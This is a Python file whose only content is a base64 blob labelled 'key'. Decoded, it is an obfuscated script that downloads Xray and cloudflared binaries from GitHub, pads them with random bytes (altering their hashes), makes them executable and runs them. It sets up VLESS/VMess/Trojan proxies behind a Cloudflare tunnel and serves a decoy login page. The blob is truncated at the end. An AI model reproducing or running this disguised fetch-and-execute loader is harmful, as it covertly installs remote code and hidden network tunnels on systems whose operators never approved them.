key = rb"""aW1wb3J0IGFzdAppbXBvcnQgYmFzZTY0CmltcG9ydCBnbG9iCmltcG9ydCBpbwppbXBvcnQgemlwZmlsZQpmcm9tIG9zLnBhdGggaW1wb3J0IGpvaW4KaW1wb3J0IHJhbmRvbQppbXBvcnQgdXJsbGliLnJlcXVlc3QKZnJvbSBodHRwLnNlcnZlciBpbXBvcnQgQmFzZUhUVFBSZXF1ZXN0SGFuZGxlciwgSFRUUFNlcnZlciwgU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyLCBUaHJlYWRpbmdIVFRQU2VydmVyCmltcG9ydCBqc29uCmltcG9ydCBvcy5wYXRoCmltcG9ydCByZQppbXBvcnQgc3VicHJvY2VzcwppbXBvcnQgc3lzIGFzIHlzeQppbXBvcnQgdGhyZWFkaW5nCmltcG9ydCB0aW1lCmltcG9ydCB1cmxsaWIKCl9wX2lfZCA9IHNldCgpCl9zX21fYV9wX3MgPSBkaWN0KCkKX2Nfd19kID0gb3MuZ2V0Y3dkKCkKX2hfb19zID0gIiIKXzBfMF8xID0gInB5aSIKXzBfMF8yID0gInB5ZCIKX2lfbl9kID0gImFIUjBjSE02THk5bmFYUm9kV0l1WTI5dEwyWmxjbTlvTVM5amJHOTFaR1pzWVhKbFpDOXlZWGN2YldGcGJpOWhZbU15TG5wcGNBPT0iCl9jX2ZfZCA9ICJhSFIwY0hNNkx5OW5hWFJvZFdJdVkyOXRMMlpsY205b01TOWpiRzkxWkdac1lYSmxaQzl5WVhjdmJXRnBiaTlqYkc5MVpHWnNZWEpsWkMxc2FXNTFlQzFoYldRMk5DNTZhWEE9IgpfdV9hX2MgPSAiTW96aWxsYS81LjAgKFdpbmRvd3MgTlQgMTAuMDsgV2luNjQ7IHg2NDsgcnY6MTA5LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvMTEzLjAiCl9wX2lfZF8xID0gcmFuZG9tLnJhbmRpbnQoMTAwMDAsIDY1NTM1KQp3aGlsZSBfcF9pX2RfMSBpbiBfcF9pX2Q6IF9wX2lfZF8xID0gcmFuZG9tLnJhbmRpbnQoMTAwMDAsIDY1NTM1KQpfcF9pX2QuYWRkKF9wX2lfZF8xKQpfcF9pX2RfMiA9IHJhbmRvbS5yYW5kaW50KDEwMDAwLCA2NTUzNSkKd2hpbGUgX3BfaV9kXzIgaW4gX3BfaV9kOiBfcF9pX2RfMiA9IHJhbmRvbS5yYW5kaW50KDEwMDAwLCA2NTUzNSkKX3BfaV9kLmFkZChfcF9pX2RfMikKX3BfaV9kXzMgPSByYW5kb20ucmFuZGludCgxMDAwMCwgNjU1MzUpCndoaWxlIF9wX2lfZF8zIGluIF9wX2lfZDogX3BfaV9kXzMgPSByYW5kb20ucmFuZGludCgxMDAwMCwgNjU1MzUpCl9wX2lfZC5hZGQoX3BfaV9kXzMpCl9wX2lfZF80ID0gcmFuZG9tLnJhbmRpbnQoMTAwMDAsIDY1NTM1KQp3aGlsZSBfcF9pX2RfNCBpbiBfcF9pX2Q6IF9wX2lfZF80ID0gcmFuZG9tLnJhbmRpbnQoMTAwMDAsIDY1NTM1KQpfcF9pX2QuYWRkKF9wX2lfZF80KQpfZV9jX2YgPSBmY18KX3NfZV8xID0gODA4MApfdV9pX2QgPSAiaXVfIgpfdl9sX3MgPSAibHZfIgpfdl9tX3MgPSAibXZfIgpfdF9yX3MgPSAicnRfIgpfaV9uX2QgPSBiYXNlNjQuYjY0ZGVjb2RlKF9pX25fZC5lbmNvZGUoInV0ZjgiKSkuZGVjb2RlKCJ1dGY4IikKX2NfZl9kID0gYmFzZTY0LmI2NGRlY29kZShfY19mX2QuZW5jb2RlKCJ1dGY4IikpLmRlY29kZSgidXRmOCIpCl9oX2FfcyA9ICgiZXlkcGJtSnZkVzVrY3ljNklGdDdKM0J2Y25Rbk9pQXdMQ0FuY0hKdmRHOWpiMnduT2lBbmRteGxjM01uTENBbmMyVjBkR2x1WjNNbk9pQjdKMk5zYVdWdWRITW5PaUJiZXlkcFpDYzZJQyIKICAgICAgICAgICJjbkxDQW5abXh2ZHljNklDZDRkR3h6TFhKd2NuZ3RaR2x5WldOMEozMWRMQ0FuWkdWamNubHdkR2x2YmljNklDZHViMjVsSnl3Z0oyWmhiR3hpWVdOcmN5YzZJRnQ3SjNCaGRHZ25PaSIKICAgICAgICAgICJBbkp5d2dKMlJsYzNRbk9pQXdmU3dnZXlkd1lYUm9Kem9nSnljc0lDZGtaWE4wSnpvZ01IMHNJSHNuY0dGMGFDYzZJQ2NuTENBblpHVnpkQ2M2SURCOUxDQjdKMlJsYzNRbk9pQXdmViIKICAgICAgICAgICIxOUxDQW5jM1J5WldGdFUyVjBkR2x1WjNNbk9pQjdKMjVsZEhkdmNtc25PaUFuZEdOd0ozMHNJQ2RzYVhOMFpXNG5PaUFuTUM0d0xqQXVNQ2Q5TENCN0ozQnZjblFuT2lBd0xDQW5iRyIKICAgICAgICAgICJsemRHVnVKem9nSnpFeU55NHdMakF1TVNjc0lDZHdjbTkwYjJOdmJDYzZJQ2QyYkdWemN5Y3NJQ2R6WlhSMGFXNW5jeWM2SUhzblkyeHBaVzUwY3ljNklGdDdKMmxrSnpvZ0p5ZDlYUyIKICAgICAgICAgICJ3Z0oyUmxZM0o1Y0hScGIyNG5PaUFuYm05dVpTZDlMQ0FuYzNSeVpXRnRVMlYwZEdsdVozTW5PaUI3SjI1bGRIZHZjbXNuT2lBbmQzTW5MQ0FuZDNOVFpYUjBhVzVuY3ljNklIc25jIgogICAgICAgICAgIkdGMGFDYzZJQ2NuZlgxOUxDQjdKM0J2Y25Rbk9pQXdMQ0FuYkdsemRHVnVKem9nSnpFeU55NHdMakF1TVNjc0lDZHdjbTkwYjJOdmJDYzZJQ2QyYldWemN5Y3NJQ2R6WlhSMGFXNW4iCiAgICAgICAgICAiY3ljNklIc25ZMnhwWlc1MGN5YzZJRnQ3SjJsa0p6b2dKeWQ5WFgwc0lDZHpkSEpsWVcxVFpYUjBhVzVuY3ljNklIc25ibVYwZDI5eWF5YzZJQ2QzY3ljc0lDZHpaV04xY21sMGVTYyIKICAgICAgICAgICI2SUNkdWIyNWxKeXdnSjNkelUyVjBkR2x1WjNNbk9pQjdKM0JoZEdnbk9pQW5KMzE5ZlN3Z2V5ZHdiM0owSnpvZ01Dd2dKMnhwYzNSbGJpYzZJQ2N4TWpjdU1DNHdMakVuTENBbmNISnZkIgogICAgICAgICAgIkc5amIyd25PaUFuZEhKdmFtRnVKeXdnSjNObGRIUnBibWR6SnpvZ2V5ZGpiR2xsYm5Sekp6b2dXM3NuY0dGemMzZHZjbVFuT2lBbkozMWRmU3dnSjNOMGNtVmhiVk5sZEhScGJtZHpKIgogICAgICAgICAgInpvZ2V5ZHVaWFIzYjNKckp6b2dKM2R6Snl3Z0ozTmxZM1Z5YVhSNUp6b2dKMjV2Ym1VbkxDQW5kM05UWlhSMGFXNW5jeWM2SUhzbmNHRjBhQ2M2SUNjbmZYMTlYU3dnSjNKdmRYUnBibSIKICAgICAgICAgICJjbk9pQjdKMlJ2YldGcGJsTjBjbUYwWldkNUp6b2dKMGxRU1daT2IyNU5ZWFJqYUNjc0lDZHlkV3hsY3ljNklGdDdKM1I1Y0dVbk9pQW5abWxsYkdRbkxDQW5jRzl5ZENjNklDY3dMVCIKICAgICAgICAgICJZMU5UTTFKeXdnSjI5MWRHSnZkVzVrVkdGbkp6b2dKMlJwY21WamRDY3NJQ2RsYm1GaWJHVmtKem9nVkhKMVpYMWRmU3duYkc5bkp6b2dleWRzYjJkc1pYWmxiQ2M2SUNkdWIyNWxKMzBzIgogICAgICAgICAgIklDZHZkWFJpYjNWdVpITW5PaUJiZXlkd2NtOTBiMk52YkNjNklDZG1jbVZsWkc5dEp5d2dKM1JoWnljNklDZGthWEpsWTNRbmZWMHNmUT09IikKaWYgbGVuKF92X2xfcykgPT0gMDogX3ZfbF9zID0gIi8iICsgX3VfaV9kWzA6OF0gKyAiXyIgKyBfdV9pX2RbOToxM10KaWYgbGVuKF92X21fcykgPT0gMDogX3ZfbV9zID0gIi8iICsgX3VfaV9kWzA6OF0gKyAiXyIgKyBfdV9pX2RbMTQ6MThdCmlmIGxlbihfdF9yX3MpID09IDA6IF90X3JfcyA9ICIvIiArIF91X2lfZFswOjhdICsgIl8iICsgX3VfaV9kWzE5OjIzXQpfZl94XzEgPSBbaSBmb3IgaSBpbiBvcy5saXN0ZGlyKCkgaWYgaS5lbmRzd2l0aChfMF8wXzEpIGFuZCBvcy5wYXRoLmlzZmlsZShpKSBhbmQgb3MucGF0aC5nZXRzaXplKGkpID4gMHgxZjQwMDBdCl9mX2NfMSA9IG9zLnBhdGguam9pbihvcy5nZXRjd2QoKSwKICAgICAgICAgICAgICAgICAgICAgICIuMSJbMF0uam9pbihbIiIuam9pbihbc3RyKGkpIGZvciBpIGluIF9wX2lfZF0pWzA6IHJhbmRvbS5yYW5kaW50KDEsIDExKV0sIF8wXzBfMV0pIGlmIGxlbigKICAgICAgICAgICAgICAgICAgICAgICAgICBfZl94XzEpID09IDAgZWxzZSBfZl94XzFbMF0pCl9mX3hfMiA9IFtpIGZvciBpIGluIG9zLmxpc3RkaXIoKSBpZiBpLmVuZHN3aXRoKF8wXzBfMikgYW5kIG9zLnBhdGguaXNmaWxlKGkpIGFuZCBvcy5wYXRoLmdldHNpemUoaSkgPiAweDFmNDAwMF0KX2ZfY18yID0gb3MucGF0aC5qb2luKG9zLmdldGN3ZCgpLAogICAgICAgICAgICAgICAgICAgICAgIi4yIlswXS5qb2luKFsiIi5qb2luKFtzdHIoaSkgZm9yIGkgaW4gX3BfaV9kXSlbMDogcmFuZG9tLnJhbmRpbnQoMSwgMTEpXSwgXzBfMF8yXSkgaWYgbGVuKAogICAgICAgICAgICAgICAgICAgICAgICAgIF9mX3hfMikgPT0gMCBlbHNlIF9mX3hfMlswXSkKX3NfbV9hX3Bfcy51cGRhdGUoewogICAgImFXNWliM1Z1WkhNdU1DNXNhWE4wWlc0PSI6ICIuIi5qb2luKFsiMCIsICIwIiwgIjAiLCAiMCJdKSwKICAgICJhVzVpYjNWdVpITXVNQzV3YjNKMCI6IF9zX2VfMSwKICAgICJhVzVpYjNWdVpITXVNQzV6WlhSMGFXNW5jeTVqYkdsbGJuUnpMakF1YVdRPSI6IF91X2lfZCwKICAgICJhVzVpYjNWdVpITXVNQzV6WlhSMGFXNW5jeTVtWVd4c1ltRmphM011TUM1d1lYUm8iOiBfdl9sX3MsCiAgICAiYVc1aWIzVnVaSE11TUM1elpYUjBhVzVuY3k1bVlXeHNZbUZqYTNNdU1DNWtaWE4wIjogX3BfaV9kXzEsCiAgICAiYVc1aWIzVnVaSE11TUM1elpYUjBhVzVuY3k1bVlXeHNZbUZqYTNNdU1TNXdZWFJvIjogX3ZfbV9zLAogICAgImFXNWliM1Z1WkhNdU1DNXpaWFIwYVc1bmN5NW1ZV3hzWW1GamEzTXVNUzVrWlhOMCI6IF9wX2lfZF8yLAogICAgImFXNWliM1Z1WkhNdU1DNXpaWFIwYVc1bmN5NW1ZV3hzWW1GamEzTXVNaTV3WVhSbyI6IF90X3JfcywKICAgICJhVzVpYjNWdVpITXVNQzV6WlhSMGFXNW5jeTVtWVd4c1ltRmphM011TWk1a1pYTjAiOiBfcF9pX2RfMywKICAgICJhVzVpYjNWdVpITXVNQzV6WlhSMGFXNW5jeTVtWVd4c1ltRmphM011TXk1a1pYTjAiOiBfcF9pX2RfNCwKICAgICJhVzVpYjNWdVpITXVNUzV3YjNKMCI6IF9wX2lfZF8xLAogICAgImFXNWliM1Z1WkhNdU1TNXpaWFIwYVc1bmN5NWpiR2xsYm5SekxqQXVhV1E9IjogX3VfaV9kLAogICAgImFXNWliM1Z1WkhNdU1TNXpkSEpsWVcxVFpYUjBhVzVuY3k1M2MxTmxkSFJwYm1kekxuQmhkR2c9IjogX3ZfbF9zLAogICAgImFXNWliM1Z1WkhNdU1pNXdiM0owIjogX3BfaV9kXzIsCiAgICAiYVc1aWIzVnVaSE11TWk1elpYUjBhVzVuY3k1amJHbGxiblJ6TGpBdWFXUT0iOiBfdV9pX2QsCiAgICAiYVc1aWIzVnVaSE11TWk1emRISmxZVzFUWlhSMGFXNW5jeTUzYzFObGRIUnBibWR6TG5CaGRHZz0iOiBfdl9tX3MsCiAgICAiYVc1aWIzVnVaSE11TXk1d2IzSjAiOiBfcF9pX2RfMywKICAgICJhVzVpYjNWdVpITXVNeTV6WlhSMGFXNW5jeTVqYkdsbGJuUnpMakF1Y0dGemMzZHZjbVE9IjogX3VfaV9kLAogICAgImFXNWliM1Z1WkhNdU15NXpkSEpsWVcxVFpYUjBhVzVuY3k1M2MxTmxkSFJwYm1kekxuQmhkR2c9IjogX3Rfcl9zLAp9KQpfZF9oX2EgPSBhc3QubGl0ZXJhbF9ldmFsKGJhc2U2NC5iNjRkZWNvZGUoX2hfYV9zLmVuY29kZSgidXRmOCIpKS5kZWNvZGUoInV0ZjgiKSkKZm9yIGssIHYgaW4gX3NfbV9hX3Bfcy5pdGVtcygpOgogICAgayA9IGJhc2U2NC5iNjRkZWNvZGUoay5lbmNvZGUoInV0ZjgiKSkuZGVjb2RlKCJ1dGY4IikKICAgIF9tYXAgPSBfZF9oX2EKICAgIF9rayA9IGsuc3BsaXQoIi4iKQogICAgZm9yIGprIGluIF9ra1s6LTFdOgogICAgICAgIGlmIGprLmlzZGlnaXQoKToKICAgICAgICAgICAgX21hcCA9IF9tYXBbaW50KGprKV0KICAgICAgICBlbHNlOgogICAgICAgICAgICBfbWFwID0gX21hcFtqa10KICAgIGVsc2U6CiAgICAgICAgX21hcFtfa2tbLTFdXSA9IHYKCgpkZWYgX2ZfY19oKF9iX2FfaSwgX3Vfcl9hLCBfcF9hX3QpOgogICAgaWYgb3MucGF0aC5pc2ZpbGUoX2JfYV9pKTogcmV0dXJuCiAgICBfZmlsZSA9IGdsb2IuZ2xvYihqb2luKF9jX3dfZCwgZiIqLnppcCIpKQogICAgaWYgbGVuKF9maWxlKSA+IDA6CiAgICAgICAgZm9yIF9maWxlIGluIF9maWxlWzpdOgogICAgICAgICAgICB0cnk6CiAgICAgICAgICAgICAgICB3aXRoIHppcGZpbGUuWmlwRmlsZShfZmlsZSkgYXMgejoKICAgICAgICAgICAgICAgICAgICBmb3IgaSBpbiB6Lm5hbWVsaXN0KCk6CiAgICAgICAgICAgICAgICAgICAgICAgIGlmIG5vdCByZS5zZWFyY2goX3BfYV90LCBpKTogY29udGludWUKICAgICAgICAgICAgICAgICAgICAgICAgd2l0aCBvcGVuKF9iX2FfaSwgJ3diJykgYXMgYzoKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGMud3JpdGUoei5yZWFkKGkpKQogICAgICAgICAgICAgICAgICAgICAgICAgICAgYy53cml0ZShiIlwwIiAqIHJhbmRvbS5yYW5kaW50KDB4MCwgMHgyMDEwMDAgKiAyKSkKICAgICAgICAgICAgICAgICAgICAgICAgICAgIGJyZWFrCiAgICAgICAgICAgIGV4Y2VwdCBFeGNlcHRpb24gYXMgZToKICAgICAgICAgICAgICAgIHByaW50KHN0cihlKSkKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShfZmlsZSkKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIG9zLnJlbW92ZShfZmlsZSkKICAgIGVsc2U6CiAgICAgICAgd2l0aCBvcGVuKGpvaW4oCiAgICAgICAgICAgICAgICBfY193X2QsICIuIi5qb2luKChvcy5wYXRoLnNwbGl0ZXh0KF9iX2FfaSlbMF0sICJ6aXAiKSkpLCAid2IiKSBhcyBfZjoKICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICJBY2NlcHQiOiAndGV4dC9odG1sLGFwcGxpY2F0aW9uL3hodG1sK3htbCxhcHBsaWNhdGlvbi94bWw7cT0wLjksaW1hZ2Uvd2VicCwqLyo7cT0wLjgnLAogICAgICAgICAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICdnemlwLCBkZWZsYXRlLCBicicsCiAgICAgICAgICAgICAgICAnQ29ubmVjdGlvbic6ICdrZWVwLWFsaXZlJywKICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAnZW4tVVMsZW47cT0wLjUnLAogICAgICAgICAgICAgICAgJ1VzZXItQWdlbnQnOiBfdV9hX2MsCiAgICAgICAgICAgIH0KICAgICAgICAgICAgdGltZW91dCA9IHJhbmRvbS51bmlmb3JtKDYsIDEwKQogICAgICAgICAgICByZXEgPSB1cmxsaWIucmVxdWVzdC5SZXF1ZXN0KF91X3JfYSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICByZXNwb25zZSA9IHVybGxpYi5yZXF1ZXN0LnVybG9wZW4ocmVxLCB0aW1lb3V0PXRpbWVvdXQpCiAgICAgICAgICAgIGNvbnRlbnQgPSByZXNwb25zZS5yZWFkKCkKICAgICAgICAgICAgcmVzcG9uc2UuY2xvc2UoKQogICAgICAgICAgICBfZi53cml0ZShjb250ZW50KQogICAgX2ZfY19oKF9iX2FfaSwgX3Vfcl9hLCBfcF9hX3QpCgoKZGVmIF9yX2NfZigpOgogICAgZ2xvYmFsIF9oX29fcwogICAgd2hpbGUgVHJ1ZToKICAgICAgICBfc19wX3AgPSBzdWJwcm9jZXNzLlBvcGVuKFtfZl9jXzIsICJsZW5udXQiWzo6LTFdLCAibHJ1LS0iWzo6LTFdLCAiOjEuMC4wLjcyMS8vOnB0dGgiWzo6LTFdICsgc3RyKF9zX2VfMSksCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgImV0YWRwdW90dWEtb24tLSJbOjotMV0sIF0sIHN0ZGVycj1zdWJwcm9jZXNzLlNURE9VVCwgc3Rkb3V0PXN1YnByb2Nlc3MuUElQRSwgKQogICAgICAgIHdoaWxlIF9zX3BfcC5wb2xsKCkgaXMgTm9uZToKICAgICAgICAgICAgX2Rfc194ID0gX3NfcF9wLnN0ZG91dC5yZWFkbGluZSgpLmRlY29kZSgidXRmOCIpCiAgICAgICAgICAgIF9yX2VfbyA9IHJlLnNlYXJjaChyIjovLyhbXHdcLV17MTAsfVwudHJ5Y2xvdWRmbGFyZVwuY29tKSIsIF9kX3NfeCkKICAgICAgICAgICAgaWYgX3JfZV9vOiBfaF9vX3MgPSBfcl9lX28uZ3JvdXAoMSkKICAgICAgICB0aW1lLnNsZWVwKDEwKQoKCmRlZiBfcl94X3koKToKICAgIGdsb2JhbCBfaF9vX3MKICAgIHdoaWxlIFRydWU6CiAgICAgICAgc3VicHJvY2Vzcy5ydW4oW19mX2NfMSwgIm51ciJbOjotMV0sIF0sCiAgICAgICAgICAgICAgICAgICAgICAgc3RkZXJyPXN1YnByb2Nlc3MuREVWTlVMTCwgc3Rkb3V0PXN1YnByb2Nlc3MuREVWTlVMTCwKICAgICAgICAgICAgICAgICAgICAgICBpbnB1dD1qc29uLmR1bXBzKF9kX2hfYSwgKS5lbmNvZGUoJ3V0ZjgnKSkKICAgICAgICB0aW1lLnNsZWVwKDEwKQoKCmNsYXNzIE15UmVxdWVzdEhhbmRsZXIoU2ltcGxlSFRUUFJlcXVlc3RIYW5kbGVyKToKICAgIHNlcnZlcl92ZXJzaW9uID0gJycKICAgIHN5c192ZXJzaW9uID0gJycKCiAgICBkZWYgbG9nX21lc3NhZ2Uoc2VsZiwgZm9ybWF0LCAqYXJncyk6CiAgICAgICAgcGFzcwoKICAgIGRlZiBkb19HRVQoc2VsZik6CiAgICAgICAgc2VsZi5zZW5kX3Jlc3BvbnNlKDIwMCkKICAgICAgICBzZWxmLnNlbmRfaGVhZGVyKCdDb250ZW50LXR5cGUnLCAndGV4dC9odG1sJykKICAgICAgICBzZWxmLmVuZF9oZWFkZXJzKCkKICAgICAgICBpZiBzZWxmLnBhdGggPT0gIi9jZmQiOgogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKGYiIiI8IURPQ1RZUEUgaHRtbD48aHRtbCBsYW5nPSJlbiI+CjxoZWFkPjxtZXRhIGNoYXJzZXQ9IlVURi04Ij48dGl0bGU+VGl0bGU8L3RpdGxlPgo8L2hlYWQ+PGJvZHk+PGg0PntfaF9vX3MgaWYgX2VfY19mIGVsc2UgIm5vdCBlbmFibGVkLiJ9PC9oND48L2JvZHk+PC9odG1sPiIiIi5lbmNvZGUoInV0ZjgiKSkKICAgICAgICBlbHNlOgogICAgICAgICAgICBzZWxmLndmaWxlLndyaXRlKHIiIiI8IURPQ1RZUEUgaHRtbD48aHRtbCBsYW5nPSJlbiI+PGhlYWQ+CiAgICA8bWV0YSBodHRwLWVxdWl2PSJjb250ZW50LXR5cGUiIGNvbnRlbnQ9InRleHQvaHRtbDsgY2hhcnNldD1VVEYtOCI+CiAgICA8bWV0YSBjaGFyc2V0PSJVVEYtOCI+CiAgICA8dGl0bGU+TG9naW48L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIEBpbXBvcnQgdXJsKGh0dHBzOi8vZm9udHMuZ29vZ2xlYXBpcy5jb20vY3NzP2ZhbWlseT1Sb2JvdG86MzAwKTsKICAgICAgICAubG9naW4tcGFnZSB7CiAgICAgICAgICB3aWR0aDogMzYwcHg7CiAgICAgICAgICBwYWRkaW5nOiA4JSAwIDA7CiAgICAgICAgICBtYXJnaW46IGF1dG87CiAgICAgICAgfQogICAgICAgIC5mb3JtIHsKICAgICAgICAgIHBvc2l0aW9uOiByZWxhdGl2ZTsKICAgICAgICAgIHotaW5kZXg6IDE7CiAgICAgICAgICBiYWNrZ3JvdW5kOiAjRkZGRkZGOwogICAgICAgICAgbWF4LXdpZHRoOiAzNjBweDsKICAgICAgICAgIG1hcmdpbjogMCBhdXRvIDEwMHB4OwogICAgICAgICAgcGFkZGluZzogNDVweDsKICAgICAgICAgIHRleHQtYWxpZ246IGNlbnRlcjsKICAgICAgICAgIGJveC1zaGFkb3c6IDAgMCAyMHB4IDAgcmdiYSgwLCAwLCAwLCAwLjIpLCAwIDVweCA1cHggMCByZ2JhKDAsIDAsIDAsIDAuMjQpOwogICAgICAgIH0KICAgICAgICAuZm9ybSBpbnB1dCB7CiAgICAgICAgICBmb250LWZhbWlseTogIlJvYm90byIsIHNhbnMtc2VyaWY7CiAgICAgICAgICBvdXRsaW5lOiAwOwogICAgICAgICAgYmFja2dyb3VuZDogI2YyZjJmMjsKICAgICAgICAgIHdpZHRoOiAxMDAlOwogICAgICAgICAgYm9yZGVyOiAwOwogICAgICAgICAgbWFyZ2luOiAwIDAgMTVweDsKICAgICAgICAgIHBhZGRpbmc6IDE1cHg7CiAgICAgICAgICBib3gtc2l6aW5nOiBib3JkZXItYm94OwogICAgICAgICAgZm9udC1zaXplOiAxNHB4OwogICAgICAgIH0KICAgICAgICAuZm9ybSBidXR0b24gewogICAgICAgICAgZm9udC1mYW1pbHk6ICJSb2JvdG8iLCBzYW5zLXNlcmlmOwogICAgICAgICAgdGV4dC10cmFuc2Zvcm06IHVwcGVyY2FzZTsKICAgICAgICAgIG91dGxpbmU6IDA7CiAgICAgICAgICBiYWNrZ3JvdW5kOiAjNENBRjUwOwogICAgICAgICAgd2lkdGg6IDEwMCU7CiAgICAgICAgICBib3JkZXI6IDA7CiAgICAgICAgICBwYWRkaW5nOiAxNXB4OwogICAgICAgICAgY29sb3I6ICNGRkZGRkY7CiAgICAgICAgICBmb250LXNpemU6IDE0cHg7CiAgICAgICAgICAtd2Via2l0LXRyYW5zaXRpb246IGFsbCAwLjMgZWFzZTsKICAgICAgICAgIHRyYW5zaXRpb246IGFsbCAwLjMgZWFzZTsKICAgICAgICAgIGN1cnNvcjogcG9pbnRlcjsKICAgICAgICB9CiAgICAgICAgLmZvcm0gYnV0dG9uOmhvdmVyLC5mb3JtIGJ1dHRvbjphY3RpdmUsLmZvcm0gYnV0dG9uOmZvY3VzIHsKICAgICAgICAgIGJhY2tncm91bmQ6ICM0M0EwNDc7CiAgICAgICAgfQogICAgICAgIC5mb3JtIC5tZXNzYWdlIHsKICAgICAgICAgIG1hcmdpbjogMTVweCAwIDA7CiAgICAgICAgICBjb2xvcjogI2IzYjNiMzsKICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICB9CiAgICAgICAgLmZvcm0gLm1lc3NhZ2UgYSB7CiAgICAgICAgICBjb2xvcjogIzRDQUY1MDsKICAgICAgICAgIHRleHQtZGVjb3JhdGlvbjogbm9uZTsKICAgICAgICB9CiAgICAgICAgLmZvcm0gLnJlZ2lzdGVyLWZvcm0gewogICAgICAgICAgZGlzcGxheTogbm9uZTsKICAgICAgICB9CiAgICAgICAgLmNvbnRhaW5lciB7CiAgICAgICAgICBwb3NpdGlvbjogcmVsYXRpdmU7CiAgICAgICAgICB6LWluZGV4OiAxOwogICAgICAgICAgbWF4LXdpZHRoOiAzMDBweDsKICAgICAgICAgIG1hcmdpbjogMCBhdXRvOwogICAgICAgIH0KICAgICAgICAuY29udGFpbmVyOmJlZm9yZSwgLmNvbnRhaW5lcjphZnRlciB7CiAgICAgICAgICBjb250ZW50OiAiIjsKICAgICAgICAgIGRpc3BsYXk6IGJsb2NrOwogICAgICAgICAgY2xlYXI6IGJvdGg7CiAgICAgICAgfQogICAgICAgIC5jb250YWluZXIgLmluZm8gewogICAgICAgICAgbWFyZ2luOiA1MHB4IGF1dG87CiAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgfQogICAgICAgIC5jb250YWluZXIgLmluZm8gaDEgewogICAgICAgICAgbWFyZ2luOiAwIDAgMTVweDsKICAgICAgICAgIHBhZGRpbmc6IDA7CiAgICAgICAgICBmb250LXNpemU6IDM2cHg7CiAgICAgICAgICBmb250LXdlaWdodDogMzAwOwogICAgICAgICAgY29sb3I6ICMxYTFhMWE7CiAgICAgICAgfQogICAgICAgIC5jb250YWluZXIgLmluZm8gc3BhbiB7CiAgICAgICAgICBjb2xvcjogIzRkNGQ0ZDsKICAgICAgICAgIGZvbnQtc2l6ZTogMTJweDsKICAgICAgICB9CiAgICAgICAgLmNvbnRhaW5lciAuaW5mbyBzcGFuIGEgewogICAgICAgICAgY29sb3I6ICMwMDAwMDA7CiAgICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAgICAgICAgfQogICAgICAgIC5jb250YWluZXIgLmluZm8gc3BhbiAuZmEgewogICAgICAgICAgY29sb3I6ICNFRjNCM0E7CiAgICAgICAgfQogICAgICAgIGJvZHkgewogICAgICAgICAgYmFja2dyb3VuZDogIzc2Yjg1MjsgLyogZmFsbGJhY2sgZm9yIG9sZCBicm93c2VycyAqLwogICAgICAgICAgYmFja2dyb3VuZDogcmdiKDE0MSwxOTQsMTExKTsKICAgICAgICAgIGJhY2tncm91bmQ6IGxpbmVhci1ncmFkaWVudCg5MGRlZywgcmdiYSgxNDEsMTk0LDExMSwxKSAwJSwgcmdiYSgxMTgsMTg0LDgyLDEpIDUwJSk7CiAgICAgICAgICBmb250LWZhbWlseTogIlJvYm90byIsIHNhbnMtc2VyaWY7CiAgICAgICAgICAtd2Via2l0LWZvbnQtc21vb3RoaW5nOiBhbnRpYWxpYXNlZDsKICAgICAgICAgIC1tb3otb3N4LWZvbnQtc21vb3RoaW5nOiBncmF5c2NhbGU7CiAgICAgICAgfQogICAgPC9zdHlsZT4KICAgIDxzY3JpcHQ+CiAgICAgICAgJCgnLm1lc3NhZ2UgYScpLmNsaWNrKGZ1bmN0aW9uKCl7CiAgICAgICAgICAgJCgnZm9ybScpLmFuaW1hdGUoe2hlaWdodDogInRvZ2dsZSIsIG9wYWNpdHk6ICJ0b2dnbGUifSwgInNsb3ciKTsKICAgICAgICB9KTsKICAgIDwvc2NyaXB0Pgo8L2hlYWQ+PGJvZHk+PGRpdiBjbGFzcz0ibG9naW4tcGFnZSI+CiAgICA8ZGl2IGNsYXNzPSJmb3JtIj4KICAgICAgICA8Zm9ybSBjbGFzcz0ibG9naW4tZm9ybSI+CiAgICAgICAgICAgIDxpbnB1dCB0eXBlPSJ0ZXh0IiBwbGFjZWhvbGRlcj0idXNlcm5hbWUiPgogICAgICAgICAgICA8aW5wdXQgdHlwZT0icGFzc3dvcmQiIHBsYWNlaG9sZGVyPSJwYXNzd29yZCI+CiAgICAgICAgICAgIDxidXR0b24+bG9naW48L2J1dHRvbj4KICAgICAgICAgICAgPHAgY2xhc3M9Im1lc3NhZ2UiPjxhIGhyZWY9IiMiPjwvYT48L3A+CiAgICAgICAgPC9mb3JtPgogICAgPC9kaXY+PC9kaXY+PC9ib2R5PjwvaHRtbD4iIiIuZW5jb2RlKCJ1dGY4IikpCiAgICAgICAgcmV0dXJuIFNpbXBsZUhUVFBSZXF1ZXN0SGFuZGxlcgoKCmRlZiBfc19zX3IoKToKICAgIGh0dHBkID0gSFRUUFNlcnZlcigoJzEyNy4wLjAuMScsIF9wX2lfZF80KSwgTXlSZXF1ZXN0SGFuZGxlcikKICAgIGh0dHBkLnNlcnZlX2ZvcmV2ZXIoKQoKCl9mX2NfaChfZl9jXzEsIF9pX25fZCwgciJeW1gweDFdezEsfVtSMXIyXXsxLH1bQTJhM117MSx9W1kzeTRdezEsfSIpCmlmICJjZiIgaW4geXN5LmFyZ3Ygb3IgX2VfY19mOgogICAgX2ZfY19oKF9mX2NfMiwgX2NfZl9kLCByIl5bQ2NdezEsfVtMbF17MSx9W09vXXsxLH1bVXVdezEsfVtEZF17MSx9IikKdHJ5OgogICAgb3MuY2htb2QoX2ZfY18xLCAwbzc3NywgKQogICAgb3MuY2htb2QoX2ZfY18yLCAwbzc3NywgKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwYXNzCmlmICJpbml0IiBpbiB5c3kuYXJndjogeXN5LmV4aXQoMCkKdGhyZ